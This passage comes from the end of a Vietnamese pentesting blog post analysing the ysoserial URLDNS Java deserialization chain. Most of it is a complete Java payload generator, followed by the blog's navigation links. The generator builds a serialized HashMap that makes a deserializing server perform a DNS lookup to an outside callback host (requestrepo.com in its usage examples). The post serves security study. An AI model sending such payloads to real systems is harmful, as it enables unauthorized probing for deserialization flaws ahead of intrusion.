class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * URLDNSPayloadGenerator</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - Tạo payload HashMap giống chain URLDNS (URL key với SilentURLStreamHandler).</span></span><br><span class="line"><span class="comment"> * - Set URL.hashCode field = -1 bằng reflection để trigger lookup khi deserialize.</span></span><br><span class="line"><span class="comment"> * - Nếu chỉ truyền &lt;target-url&gt;: in payload dưới dạng Base64 ra stdout (text).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSPayloadGenerator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Silent handler: no real connection&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makePayload</span><span class="params">(String targetUrl)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        HashMap&lt;Object, Object&gt; ht = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, targetUrl, handler);</span><br><span class="line">        ht.put(u, targetUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCodeField.setInt(u, -<span class="number">1</span>); <span class="comment">// URL.hashCode is int, so setInt is safe</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">usage</span><span class="params">(PrintStream err)</span> &#123;</span><br><span class="line">        err.println(<span class="string">&quot;Usage: java URLDNSPayloadGenerator &lt;target-url&gt; [out-file]&quot;</span>);</span><br><span class="line">        err.println(<span class="string">&quot;If no out-file provided, Base64-encoded payload is printed to stdout.&quot;</span>);</span><br><span class="line">        err.println(<span class="string">&quot;If out-file is provided, raw binary payload is written to that file.&quot;</span>);</span><br><span class="line">        err.println(<span class="string">&quot;Examples:&quot;</span>);</span><br><span class="line">        err.println(<span class="string">&quot;  java URLDNSPayloadGenerator https://a7kvklhv.requestrepo.com/&quot;</span>);</span><br><span class="line">        err.println(<span class="string">&quot;  java URLDNSPayloadGenerator https://a7kvklhv.requestrepo.com/ payload.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            usage(System.err);</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">outFile</span> <span class="operator">=</span> (args.length &gt;= <span class="number">2</span>) ? args[<span class="number">1</span>] : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> makePayload(target);</span><br><span class="line">            <span class="type">byte</span>[] ser = serialize(payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (outFile != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outFile)) &#123;</span><br><span class="line">                    fos.write(ser);</span><br><span class="line">                &#125;</span><br><span class="line">                System.err.println(<span class="string">&quot;Raw payload written to: &quot;</span> + outFile);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// In Base64 để dễ copy/paste (stdout là text, không binary)</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(ser);</span><br><span class="line">                System.out.println(b64);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error while generating payload:&quot;</span>);</span><br><span class="line">            t.printStackTrace(System.err);</span><br><span class="line">            System.exit(<span class="number">70</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/SkZ9xxeJZl.png" alt="image"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-10-28-Ysoserial-URLDNS/">https://pzhat.github.io/2025/11/15/2025-10-28-Ysoserial-URLDNS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/ysoserial/">ysoserial</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/" title="Spring Time CTF challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Spring Time CTF challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">Spring Time CTF challenge WriteUp Web App được chia làm 2 services khác nhau bao gồm:  gateman : port 8080 newsman : port 8082  Phân tích từng chức năng từng service Gateman   Nó được chạy bằng port 8080 bên cạnh đó nó còn gọi cloud cùng với đó là expose include ra các chức năng như health , info , gateway. Vậy nên có thể biết được đây là service Spring Cloud với chức năng routing đến các routes.  Newsman  Ta sẽ đi thẳng vào luôn đầu tiên là NewsController.class:  1234567891011121314151617181...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-15-CBJS-Java-Deserialize/" title="Java Deserialize CBJS Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Java Deserialize CBJS Lab</div></div><div class="info-2"><div class="info-item-1">Java Deserialize CBJS LabGiải thích chi tiết về lỗ hổng Deserialization1. Deserialization là gì?  Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền tải (như byte stream, JSON, XML).  Deserialization là quá trình ngược lại - chuyển đổi dữ liệu đã được serialize trở lại thành object trong bộ nhớ.   2. Nguyên nhân Lỗ hổng xảy ra khi:  Ứng dụng deserialize dữ liệu từ nguồn không tin cậy (user input, network). Không có validati...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-11-07-Ysoserial-CC5/" title="Ysoserial Commons Collections 5 Analyst"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ysoserial Commons Collections 5 Analyst</div></div><div class="info-2"><div class="info-item-1">Ysoserial Commons Collections 5 AnalystTổng quan CommonsCollections 5 trong YsoserialCommonsCollections là một trong những gadget chain nổi tiếng nhất trong các cuộc tấn công khai thác Java deserialization không an toàn, đặc biệt khi ứng dụng sử dụng thư viện Apache Commons Collections. Trong bài viết này, chúng ta sẽ tập trung vào CommonsCollections5 (CC5) — một trong các chain được tích hợp sẵn trong công cụ ysoserial . Mình chọn phân tích CC5 vì đây là chain được nhiều người đề xuất để học...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Sql-Injection/" title="Java Servlet Sql Injection Vulnerability by @Phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Sql Injection Vulnerability by @Phatmh</div></div><div class="info-2"><div class="info-item-1">Java Servlet Sql Injection Vulnerability by @PhatmhTổng quan cấu trúc file java123456789101112131415161718192021222324252627282930313233343536373839+---.idea   +---dataSources+---.mvn   +---wrapper+---src   +---main      +---java         +---sql_injection             +---controller             +---dao             +---model             +---util      +---resources         +---META-INF      +---webapp          +---WEB-INF   +---test       +---java       +---resources+---target    +---classes    ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-Deserialze-URLDNS-Chain-analysis-ysoserial"><span class="toc-number">1.</span> <span class="toc-text">Java Deserialze - URLDNS Chain analysis (ysoserial)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Deserialize-la-gi"><span class="toc-number">1.1.</span> <span class="toc-text">Java Deserialize là gì?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Khai-thac-Java-Object-Injection"><span class="toc-number">1.2.</span> <span class="toc-text">Khai thác Java Object Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tien-hanh-Setup-moi-truong-test"><span class="toc-number">1.3.</span> <span class="toc-text">Tiến hành Setup môi trường test</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mot-so-dieu-ve-URLDNS"><span class="toc-number">1.4.</span> <span class="toc-text">Một số điều về URLDNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tien-hanh-phan-tich-source-va-payload"><span class="toc-number">1.5.</span> <span class="toc-text">Tiến hành phân tích source và payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug"><span class="toc-number">1.6.</span> <span class="toc-text">Debug</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/05/2025-12-05-TryHackMe-Hammer/" title="Tryhackme Hammer challenge WriteUp">Tryhackme Hammer challenge WriteUp</a><time datetime="2025-12-04T18:19:12.763Z" title="Created 2025-12-05 01:19:12">2025-12-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/" title="IredTeam AS-REP Roasting">IredTeam AS-REP Roasting</a><time datetime="2025-12-01T19:26:14.492Z" title="Created 2025-12-02 02:26:14">2025-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/01/2025-12-01-SSTI-Lab/" title="ServerSide Template Injection (SSTI) Lab">ServerSide Template Injection (SSTI) Lab</a><time datetime="2025-12-01T08:32:26.148Z" title="Created 2025-12-01 15:32:26">2025-12-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/25/2025-11-25-GraphQL-API-Vulnerability/" title="GraphQL API Vulnerability">GraphQL API Vulnerability</a><time datetime="2025-11-24T21:38:11.491Z" title="Created 2025-11-25 04:38:11">2025-11-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/16/2025-11-16-CORS-PortSwigger/" title="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</a><time datetime="2025-11-16T09:11:55.936Z" title="Created 2025-11-16 16:11:55">2025-11-16</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>